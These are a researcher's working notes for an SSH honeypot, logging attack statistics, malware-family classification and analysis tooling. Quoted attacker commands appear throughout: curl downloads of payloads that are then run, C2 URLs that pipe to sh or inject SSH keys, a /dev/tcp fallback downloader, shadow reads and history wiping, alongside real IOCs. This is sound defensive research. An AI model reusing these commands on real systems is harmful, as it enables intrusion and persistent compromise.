- todo: F12 analyse runningaway.x86 if wowo.biz.id live; F11 meow binary analysis pending; F10 4 binaries recoverable from logs/C2; IRC C2 basics (#biret, Undernet, operator interaction); read Linux.MulDrop / Mirai-era Pi worms to confirm family
- result: F13 sessions 736804a5e683 a3184ec762df 4f293d7be93b 2940424ffe81, ip 176.61.50.14
- note: added the project to LinkedIn with the GitHub repo linked -- profile now reflects the honeypot work publicly

## interaction label: low -> medium (2026-06-04)

- context: started calling this "low interaction" -- just logging auth + returning fake output
- note: then the GPU miner showed up; added lspci Tesla T4, it triggered the full kill chain; wanted more of that so kept adding commands
- note: then SCP dropper -> full wire protocol so uploads "worked"; then quarantine; then SSHCHK needed arithmetic so wrote a recursive-descent $((expr)) parser; past the label by then
- result: code now -- ~80 registered commands, per-session stateful FS, real pipe chains, $((expr)), full SCP wire protocol on exec + shell, quarantine with SHA256 + path-traversal protection; that's medium interaction, closer to Cowrie than a simple auth logger
- did: changed the label in README, SECURITY.md, FINDINGS.md; added the story to FINDINGS.md under "Why medium interaction, not low"
- result(stats 2026-06-04 21:37 UTC, 226h): 4537 auth attempts, 292 source IPs, 1749 sessions, 617621 commands, 13 families
- result(stats 2026-06-05 08:46 UTC, 237.2h): 4647 auth attempts, 303 source IPs, 1859 sessions accepted, 673668 commands
- result(2026-06-05.merged): auth.log 1022K, server.log 845, session.log 894M
- note: session.log 894M wow
- result: F10 recent sessions cdc4751b1aa7 8b76cfa9433f da9ae5a0ce82 7536454ca17f cbd08ab5d046 44bf091b15ae
- result: same ip 45.12.1.4 (Ukraine) -- 9 hits across 05/06 04/06 02/06 01/06 31/05 (8 total), same files amd64 kal64 kswpad linux, still not analysed
- did: using AlienVault to profile F10 IP 45.12.1.4 + F13 IP 176.61.50.14
- ioc(176.61.50.14, Ireland, OTX): 1 domain resolved all time, 1 TLD; tags honeypot scanner, attacker-ip honeytrap; https://otx.alienvault.com/indicator/ip/176.61.50.14
- ioc(45.12.1.49, Ukraine, OTX): tags exploit honeypot vulnerability-exploitation tpot; https://otx.alienvault.com/indicator/ip/45.12.1.49
- ask: considering posting an AlienVault pulse to report all IPs + TTPs, but unsure how / what TLP to use
- ioc(F10 4-binary SHA256, same across sessions da9ae5a0 + eadedac0): amd64 0ff23a77abba239a50412c720b2e423fcb3fb00e2362189cafa116eeb9bdce27; kal64 b02337d82c44ed46e5b186bd54cde717be39da81a29fb332090d10a5c444ccb6; kswpad 6fddaa099096c0caee183e4bb95e9fe79003e6ae6dc41d6b1aa3b4aec221bd38; linux 25c34c028f0c119da251ca5d17020df79a030c7c3b86c5a8df699065016a21a2
- ioc(top IP 71.227.179.172, USA, OTX): telemetry 4 domains last 30d, 6 all time, 2 TLDs
- ioc(F12 wowo, 172.210.53.195, France): 19 auth attempts, 1 session d9ddf36a96d3 (9s, 41 commands); curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86; tags brute force ssh portscan
- ioc(F11 meow, 34.86.231.37, USA, OTX): 4 dynamic-DNS domains last 7d, 14 domains all time, 4 TLDs
- ioc(F9 minimal scanner, 111.26.6.111, China, OTX): 50 pulses last 7d

## 2026-06-16 -- 9-day pull, 491h total

- note: been a while since the last pull -- busy with the internship that just started
- result(stats): 22104 auth attempts, 923 IPs, 19316 sessions, 2544806 commands, 14 families
- result: SSHCHK went 2 sessions (May 30) -> 15071; one IP (103.105.67.170) alone did 14793 attempts = 67% of all traffic, never seen before
- result: F13 (gJw27HGL worm) hit 4 more times since Jun 2, same sha256, same script, still alive
- result: F11 meow has 2 new C2 IPs (35.237.91.38, 34.181.210.37) alongside the original 34.11.111.237; 113 sessions total
- result(new family F14, Jun 12 12:54 Rabat, session eab1131b36ad, ip 185.129.62.63, client SSH-2.0-OpenSSH_9.9 -- only real OpenSSH in the whole dataset): dropped 2 test ELF binaries via SCP then deleted them; pulled from quarantine + strings -- both literally "hello world" in raw assembly (512B x86-64 + 348B x86, two syscalls each write() then exit(), handcrafted, no libc); point is to test if execution works before sending the real payload; real payload never came; 45min earlier a F7 VPS scout from a different IP (85.215.175.242) -- might be coordinated
- result: credential feedback loop deeper -- 9 passwords now appear in both login attempts AND chpasswd targets; N41+mk##3RKWkK- at 11 login hits is the clearest (no business in a wordlist unless harvested from a real victim)

## 2026-06-22 pull -- 636.4h total

- context: window 2026-05-26 11:32 UTC -> 2026-06-21 23:59 UTC; merged dir 2026-06-22.merged
- result(delta Jun 15 -> Jun 21):
      auth attempts    22104       23993      +1889
      source IPs         923        1279       +356
      sessions         19316       21205      +1889
      commands       2544806     3518383    +973577
      passwords        12298       13099       +801
      rejected          2788        2788         +0
- note: the story this pull is what STOPPED, not what's new
- result(SSHCHK plateaued): 15071 -> 15106 sessions (+35 in six days); the ~940/day flood stopped around Jun 15; 103.105.67.170 (67% of traffic) frozen at 14793 attempts, not one new; either rotated off their scan list or the node died; strip those two and the underlying traffic was always modest
- result(F10 picked up the slack): 62 -> 84 sessions (+22), basically the entire +973k command delta (hex echo); targets amd64 1,761,647 / kal64 1,055,710 / linux 251,940 / kswpad 229,971; kswpad FROZEN at 229,971 (same as Jun 15) while the other three grew -- new sessions end/branch before the kswpad stage
- todo: replay F10 to see where the newer sessions stop
- result(AsyncSSH Vietnamese cluster = main source of new IPs): AsyncSSH_2.1.0 728 -> 896 across ~40 residential IPs (27.79.x VNPT, 171.231.x, 116.99.x, 116.110.x); Python credential stuffing, all ACCEPTED (threshold=1), ~25-50 pw each; pushed unique IPs 923 -> 1279
- result(scanner tooling diversified): PuTTY_0.84 558 -> 1213, OpenSSH_7.4 346 -> 854; first sightings paramiko_5.0.0 (1), ssh2js1.17.0 (1), AsyncSSH_2.23.0 (1), OpenSSH_10.3p1 Debian-2 (1), libssh_0.11.3 (70) / 0.10.5 (41) / 0.7.4 (13)
- result(feedback loop running): new post-accept IPs 41.250.181.190 (18), 196.69.82.45 (9), 105.158.231.168 (9); Diicot spray postgres / e3@HJgr=$4in-a- still 57 IPs / 59min; BOM junk creds climbing ------fuck------ 125 (#4), ---fuck_you---- 69; new IoT defaults nutanix/4u 39, ubnt 37
- result: no new family (still 14); report.py flagged 17 SCP-upload sessions this window (F13 worm / F14 region), quarantine not re-pulled so nothing new confirmed
- todo(next pull): sudo pull quarantine, diff hashes, check if F14 ever sent a real payload
- did(UI): wired analyze.sh to emit stats.json so the console PULL & ANALYSE button updates KPIs/IPs/passwords/banners/family counts instead of the baked snapshot; stats.py gained --json

## 2026-06-26 pull -- 724.6h total

- context: window 2026-05-26 11:37 UTC -> 2026-06-25 16:16 UTC; merged dir 2026-06-25.merged
- result(delta Jun 21 -> Jun 25):
      auth attempts    23993       25026      +1033
      source IPs        1279        1463       +184
      sessions         21205       22238      +1033
      commands       3518383     4047599     +529216
      passwords        13099       13506       +407
      rejected          2788        2788         +0
- note: quiet 4-day window, no new family, steady-state on every metric
- result(F10 still the only thing moving commands): +529k in 4 days, all echo; same two C2s (195.177.94.72:564, 45.88.91.135:35146), both unreachable, every session falls back to hex; ~4-6 sessions/day from 152.89.61.139 (Ukraine) + 45.12.1.49; all four binary targets still growing
- result: admin overtook 123456 as top password (657 vs 299), always close, now clearly separated -- possible wordlist-rotation shift or a new admin-first spray
- result(two new passwords in top 12): alpine (92, Alpine/container default, new -- suggests container targeting); lab123 (82, climbing: 16 Jun 1 -> 46 Jun 3 -> 82, likely academic/edu targeting)
- result: AsyncSSH Vietnamese cluster still expanding -- ~60 new IPs across 27.79.x VNPT, 116.99.x, 116.110.x, 171.231.x, 171.243.x; each IP 15-50 attempts then rotates; clear main source of new unique IPs
- result: BOM junk growing -- ﻿------fuck------ 125 -> 146, ---fuck_you---- 69 -> 76; a credential artifact (copy-pasted from Windows Notepad, BOM stuck); appears in top 5
- result: 103.105.67.170 still frozen at 14793 six days later -- that SSHCHK node is definitively gone from our scan list
- result: credential feedback loop depth now 12 confirmed (12 passwords in both login + chpasswd targets); 9 more candidates in chpasswd not looped back yet
- result(Period 9 kill-chain, threshold=1, since May 30): OTHER 4,028,304 (F10 echo); RECON 10,154; STAGE 4,989; EXEC 2,531; PERSIST 211; CLEANUP 96; UPLOAD 42 -- OTHER is 99.5% F10; strip it and real attacker activity is modest but consistent
- result: hourly peak still 00:00-03:00 UTC (5050, 4020, 2594, 2675); secondary 22:00 (1495) + 23:00 (1098); daytime genuinely quiet -- scanning infra runs on UTC midnight

## Jun 26 -- 749h

- result: pulled ~19:14 Rabat; nothing dramatic, one more day of the same
- result: F10 at ~102 sessions, +250k commands since yesterday; two IPs, same never-responding C2s, same hex fallback every time
- note: F10 is basically the whole project at this point -- strip it out and the rest is almost boring; impressive in a tedious way
- note: the BOM password thing is funny -- ﻿------fuck------ is #4 (155 hits); someone built a wordlist, pasted it in Notepad, saved it wrong, and the invisible BOM is now a permanent part of their spray, still "working" because we accept everything so they never noticed; ---fuck_you---- #12 at 80; whoever made this wordlist was having a bad day
- result: 1234 almost caught 123456 (302 vs 304), crossing in a day or two; admin still way ahead at 674
- result: feedback loop still 12 confirmed, one more candidate came back since last check, 8 pending -- chpasswd passwords showing up weeks later as login attempts from unrelated IPs
- note: nothing to do, just watching things accumulate

## session clustering -- fingerprint.py + cluster.py (2026-06-27)

- did: built fingerprint.py + cluster.py to derive classification rules from data instead of eyeballing -- 22551 sessions -> 404 unique patterns -> 17 clusters, deterministic string-match rules
- fix(along the way): echo-injection folding (collapses F10's 43k chunks/binary); hex-byte check on echo (was misreading SSHCHK's "ok" beacon as injection); tightened passwd/lspci rules (fewer false positives); C10 apt-vs-which-apt fix recovered 255 sessions from TAIL; C12/C13 folded into C06
- result(contamination audit): 5 own test sessions found + excluded (dropper_sim.go + manual); one (C09 gpu-recon) only caught by IP correlation, not file signature
- watch: file-sig sweep alone isn't enough
- result(C08 split confirmed by hash): F13 (Pi worm, 6 IPs same hash), F3, F14, rest is own test traffic
- bug(F2 diicot/chattr): got the conclusion wrong on first pass ("execution not confirmed")
- fix: corrected against raw session dc727dd9b39f -- execution IS real (chmod+exec of kvjeboYe, backgrounded, history wiped); still open -- the binary's identity/delivery path; working theory (uncoordinated companion-drop, like F13) partially checked; threshold was 10 then per code history, can't get a direct log readout (field didn't exist yet); auth.log window check started, not finished
- result(C01 ok-beacon, 66.3% of dataset): still no family; confirmed ~14793 separate near-instant sessions from one IP, not one giant session (duration check + screenshot of back-to-back SESSION headers)
- todo: C01 campaign-span check (first/last timestamp) not run -- last attempt failed silently because replay's ANSI codes broke the grep anchor; need --no-color or strip escapes
- todo(idea, not done): stronger bait on the ok-response, see if the beacon gates a stage-2 command we're failing

## break -- pc crash (2026-06-27 evening)

- bug: pc froze, alt-f4'd everything, lost all open terminals
- result: git status after restart -- nothing lost; all work above is untracked on disk (cluster.py, fingerprint.py, clusters_report.md, unique_patterns.json, handover.md, both tmp-sessions files, extract_binary.py, extract_all_binaries.py, audit.md, plan.md, serve.py, honeypot-console.html); NOT committed
- todo(on pickup): commit current untracked work first; fix C01 campaign-span check (--no-color); finish or drop the F2 auth.log companion-bot check; C01 still has no family (the blocker on phase B); decide on bait change for ok-beacon (separate from phase B timeline)

## F15 -- SSH liveness/capability probe (2026-06-27)

- did: assigned F15 -- the ok-beacon cluster is its own family now
- result: echo -e "\x6F\x6B" decodes to "ok", standalone, no framing/recon/follow-up; 14954 sessions, 3 source IPs, 98.9% from one IP (103.105.67.170); zero cross-cluster overlap (that IP never appears in any other named family); confirmed by a full run across all 22551 sessions
- note(read): a mass scanner testing whether the exec-channel actually executes + echoes back; if the C2 sees "ok" the target is live, else the shell is fake/broken; nothing after -- decision made externally; could be a pre-stage gate for something never seen (IP rotated off before follow-up) or just cataloguing
- todo(deferred, not urgent -- F15 bait improvement): 1 audit whether echo -e "\x6F\x6B" returns exactly the right bytes (wrong response -> C2 might already be rejecting us); 2 add follow-up detection (does 103.105.67.170 ever come back after the beacon) -- needs a session-timeline check across full history; separate task, touches the live Go server not the python pipeline, not blocking phase B
- result(2026-06-28 campaign-span on 103.105.67.170, 98.9% of F15): first session 2026-06-15 00:52, last 05:27; full campaign ~4.5h, single day, not spread out -- automated mass-scan sweep, not a persistent monitor; 14793 sessions in under 5h ~= one connection every 1-2s

## phase B -- classify.py (2026-06-27)

- did: built analysis/classify.py -- reads family_mapping.json + raw sessions, emits families.json; reuses RULES from cluster.py + session loading from fingerprint.py (no logic copied)
- result(run on full 22551-session dataset, 2026-06-26.merged, sanity checks passed): F15 3 IPs / 14954 sessions exactly; F1 1030 IPs exactly; excluded_sids 5 exactly
- result(final): 1465 IPs total; 15 families assigned; 23 multi-family IPs (legit -- same IP did credential stuffing + a payload family); 30 unclassified IPs (TAIL + C16, correct, no family by design)
- result(F2 stage breakdown per-session): 20 recon-only, 0 recon+kill, 28 recon+kill+execute; each F2 IP entry in families.json carries stage_sessions [{sid, stage}] so sessions are auditable in phase C without re-running
- result: 172.210.53.195 shows as F1+F7+F12 -- credential stuffing from the same IP that later ran the wowo session (expected, not an error)
- fix(two small, after first run): added per-session stage_sessions to F2 IP entries; replaced datetime.utcnow() with datetime.now(timezone.utc) (kills the python 3.12 warning)

## spot-check verification -- replay reads (2026-06-28)

- did: ran replay.py on mini logs (one pass per target IP), read all four outputs
- result(T1, 35.200.201.144, F1+F2): 37 sessions with commands -- 9 stop at the nvidia-smi Product Name line (recon_only), 28 end with the full crontab-r / chattr / ./randomBinary deploy (recon_kill_execute); binary name different every session; the 20/28 aggregate in classify.py is across all F2 IPs -- this one contributes 9 of the 20 recon_only, not 20
- watch(T1): F1 tag has no session-level backing in replay (every visible session is F2 recon); F1 comes from auth.log (many unique passwords), not a distinct session shape; 27 of 64 sessions had zero shell/exec events, invisible in replay -- verify F1 via auth.log directly
- result(T2, 176.61.50.14, F13): clean -- 2 upload sessions (scp -t /tmp/gJw27HGL + [scp file: tuLtUp8R 4745 bytes] + [quarantined sha256=6d1fe6ab...]), 2 execute sessions (cd /tmp && chmod +x gJw27HGL && bash -c ./gJw27HGL); same IP, same Raspbian banner, all 10:40 Rabat Jun 2; single infected Pi node, both halves confirmed
- result(T3, 172.210.53.195, F1+F7+F12): one session d9ddf36a96d3, 41 commands -- first 40 the F7 recon shape (env dump, net interfaces, which apt/yum/pacman/zypper, ping 8.8.8.8, dd, ss -tuln, shadow read), command 41 the F12 wowo deploy (chmod 777 /usr/bin/curl; curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86; ./runningaway.x86 vipies; rm; history -c); no gap, F7 recon flows directly into F12 deploy
- watch(T3): F1 tag same as T1 -- auth-only sessions invisible in replay, no session-level backing
- result(T4, 103.105.67.170, F15): SESSION 0002b78e015a -- echo -e "\x6F\x6B", 0s, nothing else, confirmed

## C2 URLs confirmed from replay (2026-06-28)

- did: grepped replay--2026-06-26-nocolor.txt for wget/curl/http; all six URLs confirmed in raw session commands, cross-checked against families.json
- ioc(F2 Diicot): http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -- saves to ~/.sysmonitor
- ioc(F5 dropper): https://14.46.136.77/sh -- pipes to sh
- ioc(F6 w.sh): http://91.239.211.89/init.sh -- tries /tmp, /var/tmp, /dev/shm
- ioc(F11 Meow): http://197.255.229.88:1987/fav.ico -- payload with multi-downloader fallback
- ioc(F11 Meow): http://197.255.229.88:1987/kon -- SSH key injected into authorized_keys
- ioc(F12 wowo): http://wowo.biz.id/wowiloveyou/runningaway.x86 -- self-deleting binary
- result: F10 C2 also uses port 3594 on 195.177.94.72 (only 564 documented before); /t/ paths observed alongside /b/ and /s/ on both C2 servers, /t/ meaning unknown
- result: F11 Meow has a second activity from 197.255.229.88:1987 (different from the three GCP C2s) -- fetches SSH key from /kon, appends to authorized_keys, then fetches payload from /fav.ico via a 6-method fallback (curl -> wget -> python3 -> python2 -> perl -> raw bash /dev/tcp); most defensive-aware downloader in the dataset; unclear if same operator
- did: added to FINDINGS.md C2 infrastructure table, F10 C2 section, F11 section, and publish_pulse.py C2_URLS
- fix(replay.py display bug, same session): ECHO_RE was matching the ok-beacon (no >> redirect) and rendering "[echo chunk -> ? (~0.0 KB)]"; fix -- only classify as echo inject when echo_target(cmd) != "?"; affected 14954 sessions (all F15), none in the main replay file (--min-cmds 3 filtered them out)

## 2026-07-09 pull -- 1057h + disk cleanup + quick-report tool

- result(stats, 1057.9h, 2026-07-09.merged): 38515 auth attempts, 2012 source IPs, 35727 sessions accepted, 6640574 commands, 18986 unique passwords
- result(delta Jun 26 -> Jul 9): auth +13176, IPs +496, sessions +13176, commands +2342268, passwords +5357
- result: F10 ELF echo injector still 99.5% of commands (6.60M echo / 6.64M total); same shape, nothing structurally new
- result: 1234 finally overtook 123456 (373 vs 363, was 302 vs 304 on Jun 26); admin still top at 1012; BOM ------fuck------ now #5 (242), ---fuck_you---- #8 (111) -- established creds now, not "new"
- did(disk cleanup): ~/honeypot-logs was 37G; verified 2026-06-26.merged is a 100% subset of 2026-07-09.merged (4,456,145 lines, 0 missing) and every .pull dir is a subset too (byte-scan membership check); deleted all redundant .merged + .pull dirs, kept 2026-06-26.merged + 2026-07-09.pull + the host-key backup; freed 30G
- watch: keep the raw compressed .pull as insurance -- it holds every daily .gz, provably a superset of the merged
- did(quick-report.py): new analysis/quick-report.py -- header-only report (span, auth attempts, source IPs, sessions accepted, commands captured); streams session.log by byte-scanning (b'"command":' + b'"msg":"shell"'/"exec"), no json parse on the big file, flat memory; ~15-25s on the 9G merged
- why: report.py's load() builds a list of every session line as parsed dicts -> tens of GB RAM -> swap/OOM on a 9G file; quick-report is O(1) memory (streaming), the fast path for huge merged logs
- did: wired quick-report into pull_and_analyse.sh --quick (that script stays local, not committed -- has VPS access details)
- fix: pull_and_analyse.sh derived paths from a stale $HOME/honeypot/... ANALYZE_SH, so --quick had never actually run; repointed QUICKREPORT to the script's own dir via BASH_SOURCE
- did(docs): updated FINDINGS.md + README.md stats to 1057h, added the Jun26->Jul9 delta table, reconciled the family count to 15, refreshed the README latest-pull paragraph
- did: reformatted this whole NOTES.md to the tagged-bullet format (daedalus style) 

